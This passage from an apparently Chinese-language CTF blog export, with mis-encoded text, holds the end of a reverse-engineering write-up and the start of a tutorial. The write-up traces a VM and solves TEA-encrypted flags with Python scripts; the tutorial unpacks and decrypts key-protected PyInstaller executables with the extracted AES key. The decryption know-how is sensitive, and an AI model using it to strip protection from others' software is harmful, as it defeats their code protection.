&lt;&lt;= a1[key[a1[6] + 3]]; a1[key[a1[6] + 2]] &amp;= 0xFF00u; break; case 5u: printf(\", a1[%d] = a1[%d] >> a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] >>= a1[key[a1[6] + 3]]; break; default: break; &#125; a1[6] = a1[6] + 4; printf(\", a1[0~3] = %d, %d, %d, %d\", a1[0], a1[1], a1[2], a1[3]); break; case 4u: printf(\"run opcode: %d\", key[a1[6]]); if (a1[0] == a1[1]) a1[8] = 0; if (a1[0] != a1[1]) a1[8] = 1; a1[6] = a1[6] + 1; break; case 5u: printf(\"run opcode: %d, \", key[a1[6]]); printf(\"change the opcode position from %d to %d, func5 count: %d\", a1[6], key[a1[6] + 1], count_func5++); a1[6] = key[a1[6] + 1]; break; case 6u: printf(\"run opcode: %d, \", key[a1[6]]); if (a1[8]) &#123; printf(\"change the opcode position from %d to %d\", a1[6], a1[6] + 2); a1[6] = (a1[6] + 2); &#125; else &#123; printf(\"change the opcode position from %d to %d\", a1[6], key[a1[6] + 1]); a1[6] = key[a1[6] + 1]; &#125; break; case 7u: printf(\"run opcode: %d, \", key[a1[6]]); if (a1[8]) &#123; printf(\"change the opcode position from %d to %d\", a1[6], key[a1[6] + 1]); a1[6] = key[a1[6] + 1]; &#125; else &#123; printf(\"change the opcode position from %d to %d\", a1[6], a1[6] + 2); a1[6] = (a1[6] + 2); &#125; break; default: break; &#125; printf(\"\\n\"); &#125;&#125;éƒ¨åˆ†è¾“å‡ºå¦‚ä¸‹ count:1, call func0, run opcode: 0 3 2 0, a1[2] = 0, a1[0~3] = 0, 0, 0, 0count:2, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 0, 0, 0, 0count:3, call func0, run opcode: 0 0 0 0, a1[0] = input[0], a1[0~3] = 48, 0, 0, 0count:4, call func0, run opcode: 0 2 1 0, a1[1] = a1[0], a1[0~3] = 48, 48, 0, 0count:5, call func0, run opcode: 0 3 2 50, a1[2] = 50, a1[0~3] = 48, 48, 50, 0count:6, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 48, 48, 50, 0count:7, call func0, run opcode: 0 0 0 0, a1[0] = input[50], a1[0~3] = 155, 48, 50, 0count:8, call func3, run opcode: 3 0 1 0, a1[1] = a1[1] + a1[0], a1[0~3] = 155, 203, 50, 0count:9, call func0, run opcode: 0 3 2 100, a1[2] = 100, a1[0~3] = 155, 203, 100, 0count:10, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 155, 203, 100, 0count:11, call func0, run opcode: 0 0 0 0, a1[0] = input[100], a1[0~3] = 201, 203, 100, 0count:12, call func3, run opcode: 3 3 1 0, a1[1] = a1[1] ^ a1[0], a1[0~3] = 201, 2, 100, 0count:13, call func0, run opcode: 0 3 0 8, a1[0] = 8, a1[0~3] = 8, 2, 100, 0count:14, call func0, run opcode: 0 2 2 1, a1[2] = a1[1], a1[0~3] = 8, 2, 2, 0count:15, call func3, run opcode: 3 4 1 0, a1[1] = (a1[1] &lt;&lt; a1[0])&amp;0xFF00, a1[0~3] = 8, 512, 2, 0count:16, call func3, run opcode: 3 5 2 0, a1[2] = a1[2] >> a1[0], a1[0~3] = 8, 512, 0, 0count:17, call func3, run opcode: 3 0 1 2, a1[1] = a1[1] + a1[2], a1[0~3] = 8, 512, 0, 0count:18, call func0, run opcode: 0 2 0 1, a1[0] = a1[1], a1[0~3] = 512, 512, 0, 0count:19, call func1, run opcode: 1 0count:20, call func0, run opcode: 0 3 0 1, a1[0] = 1, a1[0~3] = 1, 512, 0, 0count:21, call func3, run opcode: 3 0 3 0, a1[3] = a1[3] + a1[0], a1[0~3] = 1, 512, 0, 1count:22, call func0, run opcode: 0 2 0 3, a1[0] = a1[3], a1[0~3] = 1, 512, 0, 1count:23, call func0, run opcode: 0 3 1 40, a1[1] = 40, a1[0~3] = 1, 40, 0, 1count:24, call func4, run opcode: 4count:25, call func6, run opcode: 6, change the opcode position from 91 to 93count:26, call func5, run opcode: 5, change the opcode position from 93 to 0, func5 count: 1count:27, call func0, run opcode: 0 3 2 0, a1[2] = 0, a1[0~3] = 1, 40, 0, 1count:28, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 1, 40, 1, 1count:29, call func0, run opcode: 0 0 0 0, a1[0] = input[1], a1[0~3] = 49, 40, 1, 1count:30, call func0, run opcode: 0 2 1 0, a1[1] = a1[0], a1[0~3] = 49, 49, 1, 1count:31, call func0, run opcode: 0 3 2 50, a1[2] = 50, a1[0~3] = 49, 49, 50, 1count:32, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 49, 49, 51, 1count:33, call func0, run opcode: 0 0 0 0, a1[0] = input[51], a1[0~3] = 168, 49, 51, 1count:34, call func3, run opcode: 3 0 1 0, a1[1] = a1[1] + a1[0], a1[0~3] = 168, 217, 51, 1count:35, call func0, run opcode: 0 3 2 100, a1[2] = 100, a1[0~3] = 168, 217, 100, 1count:36, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 168, 217, 101, 1count:37, call func0, run opcode: 0 0 0 0, a1[0] = input[101], a1[0~3] = 169, 217, 101, 1count:38, call func3, run opcode: 3 3 1 0, a1[1] = a1[1] ^ a1[0], a1[0~3] = 169, 112, 101, 1count:39, call func0, run opcode: 0 3 0 8, a1[0] = 8, a1[0~3] = 8, 112, 101, 1count:40, call func0, run opcode: 0 2 2 1, a1[2] = a1[1], a1[0~3] = 8, 112, 112, 1count:41, call func3, run opcode: 3 4 1 0, a1[1] = (a1[1] &lt;&lt; a1[0])&amp;0xFF00, a1[0~3] = 8, 28672, 112, 1count:42, call func3, run opcode: 3 5 2 0, a1[2] = a1[2] >> a1[0], a1[0~3] = 8, 28672, 0, 1count:43, call func3, run opcode: 3 0 1 2, a1[1] = a1[1] + a1[2], a1[0~3] = 8, 28672, 0, 1count:44, call func0, run opcode: 0 2 0 1, a1[0] = a1[1], a1[0~3] = 28672, 28672, 0, 1count:45, call func1, run opcode: 1 0count:46, call func0, run opcode: 0 3 0 1, a1[0] = 1, a1[0~3] = 1, 28672, 0, 1count:47, call func3, run opcode: 3 0 3 0, a1[3] = a1[3] + a1[0], a1[0~3] = 1, 28672, 0, 2count:48, call func0, run opcode: 0 2 0 3, a1[0] = a1[3], a1[0~3] = 2, 28672, 0, 2count:49, call func0, run opcode: 0 3 1 40, a1[1] = 40, a1[0~3] = 2, 40, 0, 2count:50, call func4, run opcode: 4count:51, call func6, run opcode: 6, change the opcode position from 91 to 93count:52, call func5, run opcode: 5, change the opcode position from 93 to 0, func5 count: 2...............count:1015, call func0, run opcode: 0 3 2 0, a1[2] = 0, a1[0~3] = 39, 40, 0, 39count:1016, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 39, 40, 39, 39count:1017, call func0, run opcode: 0 0 0 0, a1[0] = input[39], a1[0~3] = 57, 40, 39, 39count:1018, call func0, run opcode: 0 2 1 0, a1[1] = a1[0], a1[0~3] = 57, 57, 39, 39count:1019, call func0, run opcode: 0 3 2 50, a1[2] = 50, a1[0~3] = 57, 57, 50, 39count:1020, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 57, 57, 89, 39count:1021, call func0, run opcode: 0 0 0 0, a1[0] = input[89], a1[0~3] = 87, 57, 89, 39count:1022, call func3, run opcode: 3 0 1 0, a1[1] = a1[1] + a1[0], a1[0~3] = 87, 144, 89, 39count:1023, call func0, run opcode: 0 3 2 100, a1[2] = 100, a1[0~3] = 87, 144, 100, 39count:1024, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 87, 144, 139, 39count:1025, call func0, run opcode: 0 0 0 0, a1[0] = input[139], a1[0~3] = 156, 144, 139, 39count:1026, call func3, run opcode: 3 3 1 0, a1[1] = a1[1] ^ a1[0], a1[0~3] = 156, 12, 139, 39count:1027, call func0, run opcode: 0 3 0 8, a1[0] = 8, a1[0~3] = 8, 12, 139, 39count:1028, call func0, run opcode: 0 2 2 1, a1[2] = a1[1], a1[0~3] = 8, 12, 12, 39count:1029, call func3, run opcode: 3 4 1 0, a1[1] = (a1[1] &lt;&lt; a1[0])&amp;0xFF00, a1[0~3] = 8, 3072, 12, 39count:1030, call func3, run opcode: 3 5 2 0, a1[2] = a1[2] >> a1[0], a1[0~3] = 8, 3072, 0, 39count:1031, call func3, run opcode: 3 0 1 2, a1[1] = a1[1] + a1[2], a1[0~3] = 8, 3072, 0, 39count:1032, call func0, run opcode: 0 2 0 1, a1[0] = a1[1], a1[0~3] = 3072, 3072, 0, 39count:1033, call func1, run opcode: 1 0count:1034, call func0, run opcode: 0 3 0 1, a1[0] = 1, a1[0~3] = 1, 3072, 0, 39count:1035, call func3, run opcode: 3 0 3 0, a1[3] = a1[3] + a1[0], a1[0~3] = 1, 3072, 0, 40count:1036, call func0, run opcode: 0 2 0 3, a1[0] = a1[3], a1[0~3] = 40, 3072, 0, 40count:1037, call func0, run opcode: 0 3 1 40, a1[1] = 40, a1[0~3] = 40, 40, 0, 40count:1038, call func4, run opcode: 4count:1039, call func6, run opcode: 6, change the opcode position from 91 to 95count:1040, call func0, run opcode: 0 3 3 0, a1[3] = 0, a1[0~3] = 40, 40, 0, 0count:1041, call func2, run opcode: 2 1count:1042, call func0, run opcode: 0 3 2 150, a1[2] = 150, a1[0~3] = 40, 3072, 150, 0count:1043, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 40, 3072, 150, 0count:1044, call func0, run opcode: 0 0 0 0, a1[0] = input[150], a1[0~3] = 18432, 3072, 150, 0count:1045, call func4, run opcode: 4count:1046, call func7, run opcode: 7, change the opcode position from 114 to 136ç”¨ python ç®€åŒ–ä¸€ä¸‹ a = [0x9b, 0xa8, 0x2, 0xbc, 0xac, 0x9c, 0xce, 0xfa, 0x2, 0xb9, 0xff, 0x3a, 0x74, 0x48, 0x19, 0x69, 0xe8, 0x3, 0xcb, 0xc9, 0xff, 0xfc, 0x80, 0xd6, 0x8d, 0xd7, 0x72, 0x0, 0xa7, 0x1d, 0x3d, 0x99, 0x88, 0x99, 0xbf, 0xe8, 0x96, 0x2e, 0x5d, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]b = [0xc9, 0xa9, 0xbd, 0x8b, 0x17, 0xc2, 0x6e, 0xf8, 0xf5, 0x6e, 0x63, 0x63, 0xd5, 0x46, 0x5d, 0x16, 0x98, 0x38, 0x30, 0x73, 0x38, 0xc1, 0x5e, 0xed, 0xb0, 0x29, 0x5a, 0x18, 0x40, 0xa7, 0xfd, 0xa, 0x1e, 0x78, 0x8b, 0x62, 0xdb, 0xf, 0x8f, 0x9c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]c = [0x4800, 0xf100, 0x4000, 0x2100, 0x3501, 0x6400, 0x7801, 0xf900, 0x1801, 0x5200, 0x2500, 0x5d01, 0x4700, 0xfd00, 0x6901, 0x5c00, 0xaf01, 0xb200, 0xec01, 0x5201, 0x4f01, 0x1a01, 0x5000, 0x8501, 0xcd00, 0x2300, 0xf800, 0xc00, 0xcf00, 0x3d01, 0x4501, 0x8200, 0xd201, 0x2901, 0xd501, 0x601, 0xa201, 0xde00, 0xa601, 0xca01, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]flag = '0123456789012345678901234567890123456789'res = [0 for i in range(40)]for i in range(40): x = a[i] + ord(flag[i]) y = x ^ b[i] z = (y &lt;&lt; 8) &amp; 0xff00 m = y >> 8 n = z + må†™ä¸ª exp a = [0x9b, 0xa8, 0x2, 0xbc, 0xac, 0x9c, 0xce, 0xfa, 0x2, 0xb9, 0xff, 0x3a, 0x74, 0x48, 0x19, 0x69, 0xe8, 0x3, 0xcb, 0xc9, 0xff, 0xfc, 0x80, 0xd6, 0x8d, 0xd7, 0x72, 0x0, 0xa7, 0x1d, 0x3d, 0x99, 0x88, 0x99, 0xbf, 0xe8, 0x96, 0x2e, 0x5d, 0x57]b = [0xc9, 0xa9, 0xbd, 0x8b, 0x17, 0xc2, 0x6e, 0xf8, 0xf5, 0x6e, 0x63, 0x63, 0xd5, 0x46, 0x5d, 0x16, 0x98, 0x38, 0x30, 0x73, 0x38, 0xc1, 0x5e, 0xed, 0xb0, 0x29, 0x5a, 0x18, 0x40, 0xa7, 0xfd, 0xa, 0x1e, 0x78, 0x8b, 0x62, 0xdb, 0xf, 0x8f, 0x9c]c = [0x4800, 0xf100, 0x4000, 0x2100, 0x3501, 0x6400, 0x7801, 0xf900, 0x1801, 0x5200, 0x2500, 0x5d01, 0x4700, 0xfd00, 0x6901, 0x5c00, 0xaf01, 0xb200, 0xec01, 0x5201, 0x4f01, 0x1a01, 0x5000, 0x8501, 0xcd00, 0x2300, 0xf800, 0xc00, 0xcf00, 0x3d01, 0x4501, 0x8200, 0xd201, 0x2901, 0xd501, 0x601, 0xa201, 0xde00, 0xa601, 0xca01]c = [i for i in reversed(c)]flag=''for i in range(40): m = c[i] >> 8 n = (c[i] &amp; 0xff) &lt;&lt; 8 y = m + n y = y ^ b[i] y = y - a[i] flag += chr(y)print(flag)# hgame&#123;y0ur_rever5e_sk1ll_i5_very_g0od!!&#125;# shellcode æŠŠ base64 å­—ç¬¦ä¸²è§£ç  import base64with open('data','wb') as f: f.write(base64.b64decode('VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D'))ç„¶åç”¨ ida æ‰“å¼€ data æ–‡ä»¶ _DWORD *__fastcall sub_0(unsigned int *a1)&#123; _DWORD *result; // rax unsigned int v2; // [rsp+20h] [rbp+0h] unsigned int v3; // [rsp+24h] [rbp+4h] int v4; // [rsp+28h] [rbp+8h] unsigned int i; // [rsp+40h] [rbp+20h] v2 = *a1; v3 = a1[1]; v4 = 0; for ( i = 0; i &lt; 0x20; ++i ) &#123; v4 -= 0x543210DD; v2 += ((v3 >> 5) + 33) ^ (v3 + v4) ^ (16 * v3 + 22); v3 += ((v2 >> 5) + 55) ^ (v2 + v4) ^ (16 * v2 + 44); &#125; *a1 = v2; result = a1 + 1; a1[1] = v3; return result;&#125;çœ‹æ¥æ˜¯æ™®é€šçš„ tea åŠ å¯† from ctypes import *def encrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x543210DD k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(0) for i in range(32): total.value -= delta v0.value += ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) v1.value += ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) return v0.value, v1.valuedef decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x543210DD k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(-delta * 32) for i in range(32): v1.value -= ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) v0.value -= ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) total.value += delta return v0.value, v1.value# testif __name__ == \"__main__\": # å¾…åŠ å¯†çš„æ˜æ–‡ï¼Œä¸¤ä¸ª 32 ä½æ•´å‹ï¼Œå³ 64bit çš„æ˜æ–‡æ•°æ® value = [0, 0] # å››ä¸ª keyï¼Œæ¯ä¸ªæ˜¯ 32bitï¼Œå³å¯†é’¥é•¿åº¦ä¸º 128bit key = [22, 33, 44, 55] with open('flag.enc', 'rb') as f: s = f.read() for i in range(0, len(s), 8): value[0] = (s[i + 3] &lt;&lt; 24) + (s[i + 2] &lt;&lt; 16) + (s[i + 1] &lt;&lt; 8) + s[i] value[1] = (s[i + 7] &lt;&lt; 24) + (s[i + 6] &lt;&lt; 16) + (s[i + 5] &lt;&lt; 8) + s[i + 4] res = decrypt(value, key) bytearray.fromhex(hex(res[0])[2::]).decode() print(bytearray.fromhex(hex(res[0])[2::]).decode()[::-1],sep='', end='') print(bytearray.fromhex(hex(res[1])[2::]).decode()[::-1],sep='', end='')# hgame&#123;th1s_1s_th3_tutu's_h0mew0rk&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"}]},{"title":"pythoné€†å‘","slug":"pythoné€†å‘","date":"2023-01-14T02:12:08.000Z","updated":"2023-11-03T09:39:03.584Z","comments":true,"path":"pythoné€†å‘/","link":"","permalink":"https://oacia.dev/python%E9%80%86%E5%90%91/","excerpt":"python ä¸­çš„é€†å‘æœ€å…³é”®çš„å°±æ˜¯è¦çœ‹åˆ° python æºç ï¼Œå¦‚æœä½¿ç”¨ ida å°†ä¼šå¤§å¤§å¢åŠ é€†å‘çš„éš¾åº¦ï¼Œæ‰€ä»¥ä½¿ç”¨å¥½æ­£ç¡®çš„å·¥å…·å’Œæ–¹æ³•å°†ä¼šè®©é€†å‘è¿‡ç¨‹äº‹åŠåŠŸå€ã€‚ python é€†å‘çš„æµç¨‹ä¸ºï¼štest.exeâ€“&gt;test.pycâ€“&gt;test.py æ¥ä¸‹æ¥æˆ‘å°†ä»‹ç»æ¯ä¸€æ­¥æ‰€ä½¿ç”¨çš„å·¥å…·ä»¥åŠåˆ°ç›®å‰ä¸ºæ­¢æˆ‘æ‰€é‡åˆ°çš„é—®é¢˜å’Œè§£å†³çš„æ–¹æ³•","text":"python ä¸­çš„é€†å‘æœ€å…³é”®çš„å°±æ˜¯è¦çœ‹åˆ° python æºç ï¼Œå¦‚æœä½¿ç”¨ ida å°†ä¼šå¤§å¤§å¢åŠ é€†å‘çš„éš¾åº¦ï¼Œæ‰€ä»¥ä½¿ç”¨å¥½æ­£ç¡®çš„å·¥å…·å’Œæ–¹æ³•å°†ä¼šè®©é€†å‘è¿‡ç¨‹äº‹åŠåŠŸå€ã€‚ python é€†å‘çš„æµç¨‹ä¸ºï¼štest.exeâ€“&gt;test.pycâ€“&gt;test.py æ¥ä¸‹æ¥æˆ‘å°†ä»‹ç»æ¯ä¸€æ­¥æ‰€ä½¿ç”¨çš„å·¥å…·ä»¥åŠåˆ°ç›®å‰ä¸ºæ­¢æˆ‘æ‰€é‡åˆ°çš„é—®é¢˜å’Œè§£å†³çš„æ–¹æ³• # exe è½¬ pyc è¿™é‡Œæ‰€ä½¿ç”¨çš„å·¥å…·ä¸º pyinstxtractor ç³»ç»Ÿçš„ python ç‰ˆæœ¬å’Œ exe ç¼–è¯‘æ—¶æ‰€ä½¿ç”¨çš„ python ç‰ˆæœ¬å¿…é¡»ç›¸åŒï¼Œå¦åˆ™å°†ä¼šå‡ºç° &lt;filename&gt;_extracted/PYZ-00.pyz_extracted å†…æ–‡ä»¶ä¸ºç©ºçš„æƒ…å†µ # pyinstaller æ— â€“key å‚æ•°ï¼ŒæœªåŠ å¯† ç”¨æ³•ä¸º python pyinstxtractor.py &lt;filename&gt; ç„¶ååœ¨æ–‡ä»¶å¤¹ä¸­å°±ä¼šå‡ºç° &lt;filename&gt;_extracted æ–‡ä»¶å¤¹ï¼Œè¿›å…¥è¯¥æ–‡ä»¶å¤¹åæ‰¾åˆ° &lt;filename&gt;.pyc æ–‡ä»¶å°±å¯ä»¥è¿›å…¥ä¸‹ä¸€æ­¥ å¦‚æœé‡åˆ°æ²¡æœ‰ &lt;filename&gt;.pyc æ–‡ä»¶ï¼Œä½†æ˜¯æœ‰ &lt;filename&gt; æ–‡ä»¶ï¼Œé‚£ä¹ˆé¦–å…ˆéœ€è¦ç”¨ 010editor æ‰“å¼€ &lt;filename&gt; æ–‡ä»¶ï¼Œç„¶åè¿›å…¥åœ¨ &lt;filename&gt;_extracted å†…æ‰¾åˆ° struct.pyc æ–‡ä»¶å¹¶ç”¨ 010editor æ‰“å¼€ï¼Œå°†å‰ 16 ä¸ªå­—èŠ‚æ’å…¥åˆ° &lt;filename&gt; æ–‡ä»¶çš„å‰é¢ï¼Œç„¶åå°†åç¼€æ”¹æˆ pyc å°±å¯ä»¥äº†. # pyinstaller æœ‰â€“key å‚æ•°ï¼ŒåŠ å¯† pyinstaller ä¸ºæˆ‘ä»¬æä¾›äº†åŠ å¯†çš„åŠŸèƒ½ï¼Œå¯ä»¥ç»™æˆ‘ä»¬çš„é€†å‘å·¥ç¨‹é€ æˆä¸€äº›å›°éš¾ PS C:\\Users\\æ˜¥è > pyinstaller.exe -h ... --key KEY The key used to encrypt Python bytecode.è¿™é‡Œç”¨ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¼”ç¤ºä¸€ä¸‹ # main.pyimport checkif __name__ == '__main__': check.check_this()# check.pydef check_this(): str = input(\"plz enter your input:\") if str==\"123123\": print(\"right\") else: print(\"wrong\")éšåä½¿ç”¨å‘½ä»¤ PS D:\\TRASHBIN\\pyinstaller--key> pyinstaller.exe -F --key oacia --upx-dir \"D:\\TOOLS\\Unpackers(ç¨‹åºè„±å£³æœº)\\upx\\upx394w\\upx394w\" .\\main.pyå¾—åˆ° main.exe å¯æ‰§è¡Œæ–‡ä»¶ æ‹–åˆ° ida é‡Œé¢å¯ä»¥çœ‹åˆ° main å‡½æ•°æ˜¯ç±»ä¼¼è¿™ç§æ ·å­çš„ æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ pyinstxtractor è§£åŒ…ä¸€ä¸‹ PS D:\\TRASHBIN\\pyinstaller--key\\dist> python D:\\TOOLS\\pythoné€†å‘\\pyinstxtractor-master\\pyinstxtractor-master\\pyinstxtractor.py .\\main.exeåœ¨ .\\main.exe_extracted æ–‡ä»¶å¤¹å†…ï¼Œæœ‰ main.pyc æ–‡ä»¶ï¼Œè¿™æ˜¯æ²¡æœ‰åŠ å¯†çš„ PS D:\\TRASHBIN\\pyinstaller--key\\dist\\main.exe_extracted> uncompyle6.exe .\\main.pyc# uncompyle6 version 3.9.0# Python bytecode version base 3.7.0 (3394)# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]# Embedded file name: main.pyimport checkif __name__ == '__main__': check.check_this()# okay decompiling .\\main.pycç„¶è€Œå½“æˆ‘ä»¬è¿›å…¥ .\\main.exe_extracted\\PYZ-00.pyz_extracted å†…åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æ–‡ä»¶éƒ½æ˜¯è¢«åŠ å¯†è¿‡çš„ï¼Œå¯ä»¥çœ‹åˆ°åç¼€ä¸º .encrypted æˆ‘ä»¬åœ¨ main.pyc è½¬æ¢æˆ py åçš„æºç ä¸­çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº† check è¿™ä¸ªåŒ…ï¼Œæˆ‘ä»¬ä¹ŸåŒæ ·å¯ä»¥æ‰¾åˆ° check.pyc.encrypted è¿™ä¸ªæ–‡ä»¶ ç°åœ¨è¦åšçš„äº‹æƒ…å°±æ˜¯è§£å¯†è¿™ä¸ªæ–‡ä»¶ å¯»æ‰¾å¯†é’¥ åœ¨ main.exe_extracted æ–‡ä»¶å¤¹å†…æ‰¾åˆ° pyimod00_crypto_key.pyc æ–‡ä»¶ï¼Œè½¬æˆ py åå°±å¯ä»¥å¾—åˆ°å¯†é’¥ 00000000000oacia PS D:\\TRASHBIN\\pyinstaller--key\\dist\\main.exe_extracted> uncompyle6.exe .\\pyimod00_crypto_key.pyc# uncompyle6 version 3.9.0# Python bytecode version base 3.7.0 (3394)# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]# Embedded file name: build\\main\\pyimod00_crypto_key.pykey = '00000000000oacia'# okay decompiling .\\pyimod00_crypto_key.pyc è§£å¯† pyc ä½¿ç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œè§£å¯† import tinyaesimport zlibCRYPT_BLOCK_SIZE = 16# å¡«å…¥å¯†é’¥key = bytes('00000000000oacia', 'utf-8')inf = open('check.pyc.encrypted', 'rb') # æ‰“å¼€åŠ å¯†æ–‡ä»¶outf = open('check.pyc', 'wb') # è¾“å‡ºæ–‡ä»¶iv = inf.read(CRYPT_BLOCK_SIZE)cipher = tinyaes.AES(key, iv)plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))outf.write(b'\\x42\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0')# æ–‡ä»¶å¤´ï¼Œå¯ä»¥å– struct.pyc çš„å‰ 16 ä¸ªå­—èŠ‚outf.write(plaintext)inf.close()outf.close() ä¹‹åä¾¿å¯ä»¥å¾—åˆ°çœŸæ­£çš„æºç  PS D:\\TRASHBIN\\pyinstaller--key\\dist\\main.exe_extracted\\PYZ-00.pyz_extracted> uncompyle6.exe .\\check.pyc# uncompyle6 version 3.9.0# Python bytecode version base 3.7.0 (3394)# Decompiled from: Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 18:58:18) [MSC v.1900 64 bit (AMD64)]# Embedded file name: check.pydef check_this(): str = input('plz enter your input:') if str == '123123': print('right') else: print('wrong')# okay decompiling .\\check.pyc# pyc è½¬ py è¿™æ˜¯æˆ‘ä»¬æƒ³è¦çœ‹åˆ°æºç æœ€å…³é”®çš„ä¸€æ­¥ # uncompyle6 # å®‰è£… pip install uncompyle6# ç”¨æ³• uncompyle6.exe -o &lt;filename>.py &lt;filename>.pycuncompyle6 åœ¨ python39 ä»¥ä¸‹éƒ½å¯ä»¥åšåˆ°æ­£å¸¸çš„åç¼–è¯‘ï¼Œä½†æ˜¯å¯¹äº python39 åŠä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œä½œè€…å´æ²¡æœ‰è¿›è¡Œæ”¯æŒï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ pycdc æ¥å¸®åŠ©æˆ‘ä»¬åç¼–è¯‘ # pycdc # å®‰è£… git clone https://github.com/zrax/pycdc.gitæƒ³è¦ä½¿ç”¨è¿™ä¸€ä¸ªå·¥å…·éœ€è¦ç”¨åˆ° cmake, è¿›å…¥å®˜ç½‘ https://cmake.org/download/ ç„¶åæ‰¾åˆ°è‡ªå·±çš„ç³»ç»Ÿç‰ˆæœ¬è¿›è¡Œå®‰è£…å°±å¯ä»¥ä½¿ç”¨äº† pycdc çš„ç”¨æ³•æ˜¯ ./pycdc.exe &lt;filename>.pycpycdc çš„å¥½å¤„æ˜¯å¯ä»¥åç¼–è¯‘ python39 åŠä»¥ä¸Šç‰ˆæœ¬çš„ pyc æ–‡ä»¶ # åœ¨çº¿ç½‘ç«™ å½“ç„¶ï¼Œæˆ‘è®¤ä¸ºæœ€æ–¹ä¾¿çš„æ–¹æ³•è¿˜æ˜¯ä½¿ç”¨åœ¨çº¿ç½‘ç«™:https://tool.lu/pyc ç›´æ¥æŠŠ pyc æ–‡ä»¶æ‹–è¿›å»å°±å¯ä»¥çœ‹åˆ° py æ–‡ä»¶äº†ï¼Œ è¦æ˜¯åƒçœèµ›è¿™ç§ä¸èƒ½è”ç½‘çš„ nt èµ›åˆ¶è¿˜æ˜¯è€è€å®å®ç”¨ github ä¸Šçš„ç¦»çº¿å·¥å…·å§ # pyc è½¬å­—èŠ‚ç  åº”å¯¹ pyc è½¬ py å¤±è´¥çš„æƒ…å†µ æ ‡å‡†çš„æ ¼å¼å¦‚ä¸‹ import marshal, disf = open(\"simple.pyc\", \"rb\").read()code = marshal.loads(f[16:]) #è¿™è¾¹ä» 16 ä½å¼€å§‹å–å› ä¸ºæ˜¯ python3 python2 ä» 8 ä½å¼€å§‹å–dis.dis(code)æ³¨æ„åœ¨å¯¹ pyc é€†å‘çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šå‡ºç° uncompyle6.exe æ— æ³•åˆ†æ pyc çš„æƒ…å†µï¼Œé‚£ä¹ˆå¯èƒ½çš„åŸå› æœ‰å¦‚ä¸‹å‡ ç‚¹ python ç‰ˆæœ¬å’Œ pyc ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œæ­¤æ—¶éœ€è¦åˆ‡æ¢ python ç‰ˆæœ¬ pyc æºæ‚æœ‰èŠ±æŒ‡ä»¤ å‡ºç°è¿™ç§æƒ…å†µï¼Œéœ€è¦å°†èŠ±æŒ‡ä»¤çš„éƒ¨åˆ†åˆ é™¤ï¼Œå¹¶ä¸”æ›´æ”¹ co_code çš„å€¼ï¼Œ co_code çš„å€¼å¯ä»¥é€šè¿‡ python ä»£ç  len(code.co_code) å¾—åˆ°ï¼Œ co_code åœ¨ python åå…­è¿›åˆ¶ä¸­çš„ç¬¬ä¸‰è¡Œï¼Œç¬¬åï¼Œåä¸€ä¸ªå­—èŠ‚å‚è€ƒä¸‹å›¾çš„ä½ç½® å­—èŠ‚ç æå–å‡ºæ¥åï¼Œå¦‚æœæ„Ÿè§‰çœ‹å­—èŠ‚ç 